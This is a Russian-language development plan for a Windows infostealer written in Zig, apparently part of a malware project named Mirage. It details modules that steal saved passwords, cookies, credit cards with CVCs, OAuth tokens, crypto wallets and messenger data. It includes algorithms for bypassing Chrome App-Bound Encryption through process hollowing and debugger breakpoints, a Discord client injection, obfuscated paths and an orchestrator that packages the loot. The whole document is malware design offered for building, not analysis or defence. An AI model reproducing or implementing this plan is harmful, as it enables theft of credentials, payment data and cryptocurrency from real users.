# Phase 4: Data Theft — План реализации

## Общая архитектура

```
src/
├── parsers/
│   ├── sqLoot.zig          # SQLite parser (header → page → cell → record)
│   ├── berkeley_db.zig     # BerkeleyDB reader (Firefox key4.db)
│   └── asn1.zig            # ASN1/DER parser
├── browsers/
│   ├── chromium.zig        # Chromium orchestrator (40+ browsers)
│   ├── chromium_paths.zig  # Browser paths (comptime XOR-encrypted)
│   ├── chromium_login.zig  # Login Data → decrypt passwords
│   ├── chromium_cookies.zig# Network/Cookies → decrypt
│   ├── chromium_cards.zig  # Web Data → credit cards + CVC + IBANs
│   ├── chromium_history.zig# History → URLs + timestamps
│   ├── chromium_autofill.zig# Web Data → autofill
│   ├── chromium_bookmarks.zig# Bookmarks JSON parser
│   ├── chromium_extensions.zig# Local Extension Settings → wallets
│   ├── firefox.zig         # Firefox orchestrator
│   ├── firefox_login.zig   # logins.json → NSS decrypt
│   ├── firefox_cookies.zig # cookies.sqlite
│   ├── firefox_history.zig # places.sqlite
│   ├── firefox_bookmarks.zig# places.sqlite (bookmarks)
│   └── appbound.zig        # Chrome v20+ App-Bound bypass
├── wallets/
│   ├── wallets.zig         # Orchestrator
│   ├── wallet_extensions.zig# 90+ extension dirs copy
│   └── wallet_desktop.zig  # Exodus, Electrum, Atomic, etc.
├── messengers/
│   ├── discord.zig         # LevelDB token + injection
│   ├── telegram_mess.zig   # tdata/ directory
│   ├── signal_mess.zig     # Signal config + db
│   └── pidgin.zig          # accounts.xml
├── gaming/
│   ├── steam.zig           # ssfn*, config.vdf, loginusers.vdf
│   ├── uplay.zig           # Ubisoft
│   └── minecraft.zig       # .minecraft
├── system/
│   ├── system_info.zig     # Collector → formatted string
│   ├── os_info.zig         # Registry + syscalls
│   ├── hardware.zig        # CPU, GPU, RAM (NtQuerySystemInformation)
│   ├── network_info.zig    # Hostname, IP, MAC, WiFi
│   ├── screenshot.zig      # GDI BitBlt
│   ├── file_grabber.zig    # By masks from Desktop/Documents
│   └── antivirus.zig       # Registry scan
├── crypto/                 # Phase 3 — already done
│   ├── dpapi.zig
│   ├── chrome_crypto.zig
│   ├── chacha_poly.zig
│   ├── archive_crypt.zig
│   ├── chrome_key.zig
│   └── dll_loader.zig
├── network/                # Phase 5
│   ├── ...
├── steal.zig               # Phase 4 orchestrator (entry point)
└── main.zig                # Entry → Phase 1-3 init → Phase 4 steal
```

---

## 4.1 SQLite Parser (sqLoot)

### Источники
- **RedLine** (C#): `SqlConnection.cs` — 366 строк, кастомный парсер, hand-parses SQLite page structure
- **SentinelStealer** (C#): `SqlReader.cs` — кастомный reader в `Extensions/`
- **Skuld** (Go): `modernc.org/sqlite` — pure Go, no CGO

### Формат SQLite
```
Header (100 bytes):
  Magic: "SQLite format 3\0" (16 bytes)
  Page size (2 bytes) — обычно 4096
  Write version, Read version, Reserved, Max payload fraction
  Min payload fraction, Leaf payload fraction, File change counter
  Page count (4 bytes), First freelist trunk page, Total freelist pages
  Schema cookie, Schema format, Default page cache size
  Largest B-tree page, Text encoding, User version, Incremental-vacuum
  Application ID (20 bytes reserved)
  Version-valid-for (4 bytes), SQLite version (4 bytes)

Page types:
  0x02: Interior index
  0x05: Interior table
  0x0A: Leaf index
  0x0D: Leaf table

Cell pointer array: at end of page, array of 2-byte offsets
Cell: varint(payload_length) + varint(row_id) + payload
Payload: header_size + type1 + val1 + type2 + val2 + ...
Varint: MSB=1 продолжение, MSB=0 последний байт, 7 бит данных
Serial types:
  0: NULL, 1: 8-bit signed, 2: 16-bit signed, 3: 24-bit signed
  4: 32-bit signed, 5: 48-bit signed, 6: 64-bit signed, 7: 64-bit float
  8: 0, 9: 1, 10-11: reserved, >=12: (type-12)/2 bytes TEXT/BLOB
```

### Сисколлы
- `NtCreateFile` — открыть .db файл
- `NtReadFile` — читать страницы
- `NtQueryInformationFile` — размер файла

### API
```zig
pub const SqliteDb = struct {
    pub fn open(path: []const u8) ?SqliteDb
    pub fn deinit(self: *SqliteDb) void
    pub fn exec(self: *SqliteDb, query: []const u8) ?SqlResult
};

pub const SqlResult = struct {
    columns: [][]const u8,
    rows: [][]const u8,  // flat array: rows[row * col_count + col]
    row_count: usize,
    col_count: usize,
    pub fn get(self: *const SqlResult, row: usize, col: usize) ?[]const u8
};
```

---

## 4.2 Chrome ABE Bypass (v20+)

### Метод A: COM Elevator (Primary)

#### Источники
- **SentinelStealer** (C++): `Elevator.cpp`, `Elevator.h` — полная реализация COM вызова
- **xaitax/Chrome-App-Bound-Encryption-Decryption**: оригинальный ChromElevator проект

#### Алгоритм
```
1. Process Hollowing:
   - Создаём suspended процесс браузера (chrome.exe, msedge.exe, brave.exe)
   - Используем NtCreateUserProcess с CREATE_SUSPENDED
   - Unmap оригинальный image (NtUnmapViewOfSection)
   - Allocate память, пишем ChromiumDecryptor DLL
   - Применяем relocations + импорты (рефлективная загрузка)
   - Set thread context → возобновление

2. Внутри инжектированной DLL:
   - PEB walk → ntdll → Halo's Gate SSN resolution
   - Читаем Local State → app_bound_encrypted_key
   - CoInitializeEx → CoCreateInstance(CLSID_Elevator)
   - CoSetProxyBlanket(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
   - elevator.DecryptData(encrypted_key, &plain_key)

3. Передача ключа обратно:
   - Named pipe (\\.\pipe\MiragePipe)
   - Получаем v20_master_key

4. Применение ключа:
   - Расшифровка всех v20-префиксных данных
   - AES-256-GCM с v20_master_key
```

#### CLSID/IID таблица (из SentinelStealer Settings.h)
| Браузер | CLSID | IElevator (v1) | IElevator2 (v2) |
|---------|-------|----------------|-----------------|
| Chrome | `{708860E0-F641-4611-8895-7D867DD3675B}` | `{463ABECF-410D-407F-8AF5-0DF35A005CC8}` | `{1BF5208B-295F-4992-B5F4-3A9BB6494838}` |
| Chrome Beta | `{DD2646BA-3707-4BF8-B9A7-038691A68FC2}` | `{A2721D66-376E-4D2F-9F0F-9070E9A42B5F}` | `{B96A14B8-D0B0-44D8-BA68-2385B2A03254}` |
| Brave | `{576B31AF-6369-4B6B-8560-E4B203A97A8B}` | `{F396861E-0C8E-4C71-8256-2FAE6D759CE9}` | `{1BF5208B-295F-4992-B5F4-3A9BB6494838}` |
| Edge | `{1FCBE96C-1697-43AF-9140-2897C7C69767}` | `{C9C2B807-7731-4F34-81B7-44FF7779522B}` | `{8F7B6792-784D-4047-845D-1782EFBEF205}` |
| Avast | `{EAD34EE8-8D08-4CA1-ADA3-64754374D811}` | `{7737BB9F-BAC1-4C71-A696-7C82D7994B6F}` | N/A |

**Важно:** У Avast интерфейс имеет 12 методов вместо 3. `DecryptData` находится на 11-й позиции vtable (offset 104), а не на 3-й (offset 40).

### Метод B: Hardware Breakpoint (Secondary, VoidStealer 2026)

#### Источники
- **VoidStealer v2.0** (March 2026): Первый в дикой природе
- **ElevationKatz/Meckazin**: Открытый PoC

#### Алгоритм
```
1. CreateProcess(chrome.exe, DEBUG_ONLY_THIS_PROCESS)
2. WaitForDebugEvent → LOAD_DLL_DEBUG_EVENT
3. При загрузке chrome.dll:
   a. ReadProcessMemory → сканируем .rdata на "OSCrypt.AppBoundProvider.Decrypt.ResultCode"
   b. Получаем адрес строки → string_addr
   c. ReadProcessMemory → сканируем .text на 48 8D 0D (LEA RCX, [rip+disp32])
   d. Для каждого LEA: вычисляем target = instr_addr + 7 + disp32
   e. Если target == string_addr → это искомый LEA → breakpoint_addr
4. На каждый тред:
   - SuspendThread → SetThreadContext(DR0 = breakpoint_addr, DR7 = enable) → ResumeThread
   - Обработка CREATE_THREAD_DEBUG_EVENT → то же самое
5. При срабатывании breakpoint:
   - EXCEPTION_SINGLE_STEP → регистр R15 = v20_master_key pointer
   - ReadProcessMemory → извлекаем ключ
   - TerminateProcess(chrome.exe)
```

### Метод C: Remote Debug Port (Fallback, Phemedrone)

```
Chrome --remote-debugging-port=9222 --headless --window-position=-9999,0
  ↓
HTTP GET http://localhost:9222/json → websocketDebuggerUrl
  ↓
WebSocket → Runtime.evaluate → cookie dump
```

---

## 4.3 Chromium — 40+ браузеров

### Список браузеров (собрано из SentinelStealer + Skuld + LummaC2 + RedLine)

Группа 1 — Major: Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, Yandex
Группа 2 — Minor: CentBrowser, CocCoc, Amigo, Torch, Kometa, Orbitum, 7Star, Sputnik, Iridium, Comodo Dragon, Epic Privacy, Uran, Chromium, Slimjet, SRWare Iron, Blisk, Sodium
Группа 3 — Legacy: QIP Surf, Nichrome, RockMelt, CoolNovo, Elements Browser, Chedot, Liebao, Maxton, SalamWeb, 360 Browser, QQ Browser, Sogou, ACE Browser

Все пути — comptime XOR-encrypted, расшифровываются на момент исполнения.

### Профили
```
User Data/Default/
User Data/Profile 1/...Profile N/
Network/Cookies (в корне User Data — для старых версий)
```

### Данные

| Файл | Таблица | Данные | Шифрование |
|------|---------|--------|------------|
| `Login Data` | `logins` | url, username, password | AES-GCM (v10/v11) или DPAPI (legacy) или App-Bound (v20+) |
| `Login Data For Account` | `logins` | account passwords | AES-GCM |
| `Network/Cookies` | `cookies` | host, path, name, value, expires | AES-GCM (v10/v11) или plaintext (legacy) |
| `Cookies` | `cookies` | старое расположение | то же |
| `Web Data` | `credit_cards` | card number, holder, month, year | AES-GCM |
| `Web Data` | `local_stored_cvc` | CVC/CVV | AES-GCM |
| `Web Data` | `local_ibans` | IBAN numbers | AES-GCM |
| `Web Data` | `autofill` | name, value | plaintext |
| `Web Data` | `token_service` | Google OAuth tokens | AES-GCM |
| `History` | `urls` | url, title, visit_count, last_visit_time | plaintext |
| `Bookmarks` | JSON file | url, name, date_added | plaintext |

### Профилирование (из SentinelStealer Chromium.cs)
```zig
fn listProfiles(root: []const u8) [][]const u8 {
    // 1. Default/
    // 2. Profile 1/...Profile N/
    // 3. Если есть Network/Cookies → корень тоже профиль
}
```

### Yandex Browser специфика
Yandex Browser использует отдельные файлы вместо SQLite для паролей и карт:
- `Ya Passman Data` — логины
- `Ya Credit Cards` — карты
- Ключ для Yandex лежит в `Local State` поле `yandex_passman_key`
- Шифрование: дополнительный AuthenticatedData.Decrypt с параметрами url, username_element, password_element

---

## 4.4 Firefox (Gecko) — 10+ профилей

### Список браузеров
- Firefox, Firefox Beta, Firefox Developer, Firefox Nightly
- Firefox ESR, Thunderbird, SeaMonkey
- Waterfox, K-Meleon, Pale Moon, IceDragon, Cyberfox, BlackHaw
- Tor Browser

### Формат хранения

```
%APPDATA%/Mozilla/Firefox/Profiles/*.default/
├── key4.db          # BerkeleyDB — ключи шифрования
├── logins.json      # JSON — зашифрованные пароли
├── cookies.sqlite   # SQLite — куки
├── places.sqlite    # SQLite — история + закладки
├── formhistory.sqlite # SQLite — автозаполнение
└── cert9.db         # BerkeleyDB — сертификаты
```

### NSS Decryption Pipeline (из Skuld Go source)

```
key4.db:
  ├── metaData table: item1 = PBKDF2 salt (16B), item2 = PBKDF2 iterations (1-4)
  └── nssPrivate table: a11 = encrypted private key (AES-128-CBC)

ASN1 parsing цепочки:
  data → unpack PBE → salt(16) + encrypted(24)
    ↓
  PBKDF2-SHA256(password="", salt, iterations) → AES key + IV
    ↓
  AES-128-CBC decrypt → nssPrivate key
    ↓
  NSS key = first 16 bytes

logins.json:
  {
    "logins": [{
      "hostname": "...",
      "encryptedUsername": "...",   // 3DES-CBC
      "encryptedPassword": "..."    // 3DES-CBC
      "encType": 1,                 // 1 = 3DES
      "timeCreated": 12345,
      "timePasswordChanged": 12346,
      ...
    }]
  }

3DES-CBC расшифровка:
  Через NSS key + PK11SDR_Decrypt или свою реализацию 3DES-CBC
```

### Альтернатива (из SentinelStealer C#)
```csharp
// Load nss3.dll → NSS_Init(profile_path) → PK11SDR_Decrypt
[DllImport("nss3.dll")]
static extern int NSS_Init(string configdir);
[DllImport("nss3.dll")]  
static extern int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx);
```

Этот подход **проще**: загружаем nss3.dll (лежит в папке Firefox), вызываем `NSS_Init` и `PK11SDR_Decrypt`. Но требует LdrLoadDll + export resolution.

---

## 4.5 Wallet Theft — 90+ расширений + десктоп

### Extension wallets

Расширения хранят данные в:
```
%LOCALAPPDATA%/Browser/User Data/Default/Local Extension Settings/{extension_id}/
├── log  (LevelDB)
├── MANIFEST-00001  (LevelDB)
├── CURRENT
└── LOCK
```

Мы копируем всю директорию целиком (как делают все стилеры).

### Список extension ID (90+ из SentinelStealer + Skuld + LummaC2)

```
MetaMask:    nkbihfbeogaeaoehlefnkodbefgpgknn
Phantom:     bfnaelmomeimhlpmgjnjophhpkkoljpa
Trust:       egjidjbpglichdcondbcbdnbeeppgdph
Coinbase:    hnfanknocfeofbddgcijnmhnfnkdnaad
TronLink:    ibnejdfjmmkpcnlpebklmnkoeoihofec
Ronin:       fnjhmkhhmkbjkkabndcnnogagogbneec
Binance:     fhbohimaelbohpjbbldcngcnapndodjp
Keplr:       dmkamcknogkgcdfhhbddcghachkejeap
Yoroi:       ffnbelfdoeiohenkjibnmadjiehfgajp
OKX:         mcohilncbfahbmgdjkbpemcciiolgcge
ExodusWeb3:  aholpfdialjgjfhomihkjbmgjidlcdno
Nifty:       jbdaocneiiinmjbjlgalhcelgbejmnid
Math:        afbcbjpbpfadlkmhmclhkeeodmamcflc
Coin98:      aeachknmefphepccionboohckonoeemg
Temple:      okpplpplklgmpghekgkegejgmmcmlhhk
SubWallet:   onhogfjeacnfoofkfgppdlbmlmnplgbn
Talisman:    fijngjgcjhjmmpcmkeiomlglpeiijkld
Rabby:       acmacodkjbdgnolefmlmkchkdgmemhob
Zerion:      klghhnkeealcohjlanjjlneabhbmpfpl
...90+ total...
```

### Desktop wallets

| Wallet | Директория | Файлы |
|--------|-----------|-------|
| Exodus | `%APPDATA%/Exodus/` | `exodus.wallet` |
| Electrum | `%APPDATA%/Electrum/wallets/` | `*` |
| Atomic Wallet | `%APPDATA%/atomic/Local Storage/` | `leveldb/*` |
| Guarda | `%APPDATA%/Guarda/Local Storage/` | `leveldb/*` |
| Coinomi | `%APPDATA%/Coinomi/` | `wallets/*` |
| Zcash | `%APPDATA%/Zcash/` | `wallet.dat` |
| Armory | `%APPDATA%/Armory/` | `*.wallet` |
| Ethereum keystore | `%APPDATA%/Ethereum/keystore/` | `UTC--*` |
| Jaxx | `%APPDATA%/Jaxx/` | `Local Storage/*` |

---

## 4.6 Messenger Theft

### Discord

**Токен:** Chromium LevelDB формат:
```
%APPDATA%/discord/Local Storage/leveldb/
  ├── log
  ├── MANIFEST-00001
  └── LOCK
```

Токен = `mfa.VZmB...` (регулярка: `[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)

**Discord Injection** (из Skuld): скачиваем injection.js с GitHub → записываем в `%APPDATA%/discord/settings.json` → добавляем в `%LOCALAPPDATA%/Discord/app-*/modules/discord_desktop_core/index.js` строчку загрузки.

### Telegram

Копируем `%APPDATA%/Telegram Desktop/tdata/` целиком.

### Signal

```
%APPDATA%/Signal/
├── config.json
├── sql/db.sqlite (шифрован ключом из config.json)
```

### Pidgin

`%APPDATA%/.purple/accounts.xml`

---

## 4.7 System Info

| Модуль | Данные | Источник |
|--------|--------|----------|
| OS | Version, build, arch, install date | `NtOpenKey` → `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion` |
| Hostname | Computer name | `NtOpenKey` + `NtQueryValueKey` |
| Username | Логин пользователя | PEB → ProcessParameters → CommandLine |
| HWID | MD5(domain+user+volume_serial) | Своя комбинация |
| CPU | Name, cores, threads | `NtQuerySystemInformation(SystemBasicInformation)` — уже есть |
| GPU | Name, VRAM | `NtOpenKey` → `HKLM\HARDWARE\DEVICEMAP\VIDEO` |
| RAM | Total, free | `NtQuerySystemInformation(SystemBasicInformation)` — уже есть |
| Disks | Letter, total, free, filesystem | `NtQueryVolumeInformationFile` |
| Screens | Resolution, count | `NtUserGetSystemMetrics` — уже есть |
| Network | Public IP, local IP, MAC, ISP | HTTP API (ip-api.com или similar) |
| WiFi | SSID, password | `NtCreateFile` → `\Device\Wlan\*` или cmd `netsh wlan show profiles` |
| Antivirus | Name | `NtOpenKey` → `HKLM\SOFTWARE\Microsoft\Windows Defender` |
| Processes | Running list | `NtQuerySystemInformation(SystemProcessInformation)` |
| Uptime | Seconds since boot | `NtQuerySystemInformation(SystemBasicInformation)` |
| Locale | Language, country, timezone | Registry + TEB |

---

## 4.8 File Grabber

По маскам из Desktop/Documents/Downloads (как сделан в RedLine, SentinelStealer, Phantom):
```zig
const grab_patterns = .{
    "*.txt", "*seed*", "*.dat", "*.mafile",
    "*.wallet", "*backup*", "*.key", "*password*",
    "*.png", "*.jpg", "*.pdf",
};
const grab_dirs = .{
    "Desktop", "Documents", "Downloads",
};
```

Макс размер: 5MB (SentinelStealer стандарт). Макс глубина: 2-3 уровня.

---

## 4.9 Архитектура steeal.zig (оркестратор)

```zig
pub fn steal(allocator: *Allocator) ![]const u8 {
    // 1. System info collection
    const sysinfo = try system.collect();
    
    // 2. Browser theft
    //    — Kill browser processes (Antarctida style)
    //    — Chrome/Chromium: iterate 40+ browser dirs
    //    — Firefox/Gecko: iterate 10+ browser dirs
    const browser_data = try browsers.collect();
    
    // 3. Wallet theft
    const wallet_data = try wallets.collect();
    
    // 4. Messenger theft
    const messenger_data = try messengers.collect();
    
    // 5. Gaming theft
    const gaming_data = try gaming.collect();
    
    // 6. File grabber
    const grabbed_files = try file_grabber.collect();
    
    // 7. Archive + Encrypt
    var archive = try buildArchive(allocator, .{
        sysinfo, browser_data, wallet_data,
        messenger_data, gaming_data, grabbed_files,
    });
    defer allocator.free(archive);
    
    const encrypted = try archive_crypt.encryptArchive(archive);
    return encrypted;
}
```

---

## Новые сисколлы для Phase 4

Из EidosLoader уже есть (нужно портировать):
- `NtReadVirtualMemory` — для HW breakpoint ABE bypass
- `NtCreateUserProcess` — для COM Elevator process hollowing
- `NtQueryDirectoryFile` — для обхода директорий профилей
- `NtSetInformationFile` — для удаления/очистки

Текущие (уже в Mirage):
- `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtFreeVirtualMemory`
- `NtWriteVirtualMemory`, `NtClose`, `NtCreateSection`, `NtMapViewOfSection`
- `NtQuerySystemInformation`, `NtCreateFile`, `NtWriteFile`
- `NtCreateEvent`, `NtWaitForSingleObject`, `NtOpenKey`, `NtQueryValueKey`
- `NtQueryInformationProcess`, `NtSetInformationProcess`, `NtDelayExecution`
- `NtUserGetSystemMetrics`

---

## Оценка объёма

| Модуль | Файлы | Строки (est.) | Зависимости |
|--------|-------|---------------|-------------|
| sqLoot | 1 | ~400 | NtCreateFile, NtReadFile |
| BerkeleyDB | 1 | ~200 | NtCreateFile, NtReadFile |
| ASN1 parser | 1 | ~150 | — |
| Chromium orchestrator | 10 | ~1500 | sqLoot, chrome_crypto, appbound |
| Firefox/Gecko | 5 | ~800 | sqLoot, BerkeleyDB, ASN1 |
| App-Bound bypass | 1 | ~500 | NtCreateUserProcess, NtReadVirtualMemory |
| Wallet extensions | 1 | ~200 | Directory ops |
| Wallets desktop | 1 | ~150 | Directory ops |
| Discord | 1 | ~100 | LevelDB/regex |
| Telegram | 1 | ~30 | Directory copy |
| System info | 7 | ~700 | NtOpenKey + syscalls |
| File grabber | 1 | ~100 | NtQueryDirectoryFile |
| Orchestrator | 1 | ~200 | All of the above |
| **Total** | **~32** | **~5000** | |

---

## Порядок реализации

```
Step 1:  sqLoot (SQLite parser)
Step 2:  Chromium orchestrator + браузерные профили  
Step 3:  Chromium passwords, cookies, cards (AES-GCM decrypt — уже готов crypto)
Step 4:  Chrome App-Bound bypass (COM Elevator)
Step 5:  History, autofill, bookmarks
Step 6:  Wallet extensions (90+)
Step 7:  Firefox Gecko (NSS decryption)
Step 8:  Desktop wallets
Step 9:  Discord, Telegram, Signal messengers  
Step 10: System info + file grabber
Step 11: Gaming (Steam, Uplay, Minecraft)
Step 12: Orchestrator интеграция + тесты
```
